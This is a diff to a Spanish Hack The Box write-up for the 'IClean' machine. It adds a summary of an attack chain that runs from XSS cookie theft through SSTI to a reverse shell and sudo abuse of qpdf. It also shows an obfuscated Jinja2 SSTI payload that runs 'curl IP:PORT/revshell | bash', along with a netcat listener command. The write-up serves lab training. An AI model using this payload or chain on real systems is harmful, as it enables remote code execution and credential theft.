@@ -1,7 +1,8 @@
 ---
 layout: single
 title: IClean - Hack The Box
-excerpt: ""
+excerpt: "
+Para resolver esta máquina, interceptamos la solicitud de inicio de sesión, logrando llevar a cabo un XSS para robar una cookie de sesión válida. Con esta cookie, ingresamos al dashboard, que contiene un sistema de facturación que genera un código QR y un enlace. Al utilizar el enlace, se crea un escaneable, cuya solicitud interceptamos para poder inyectar SSTI. Posteriormente, logramos establecer una Reverse Shell. En el código fuente de la web, descubrimos en texto claro el usuario y la contraseña de la base de datos, encontrando así las credenciales de un usuario válido que desencriptamos. Finalmente, abusamos de los permisos SUDOERS del binario "qpdf" para convertirnos en ROOT."
 date: 2024-6-5
 classes: wide
 header:
@@ -145,7 +146,7 @@ nc -nlvp PORT
 5. Usamos este payload en la solicitud:
 
 ```python
-{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl IP:PORT/revshell | bash")|attr("read")()}}
+ {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl IP:PORT/revshell | bash")|attr("read")()}}
 ```
 
 ![](/assets/images/htb-writeup-iclean/Pasted image 20240605173635.png)
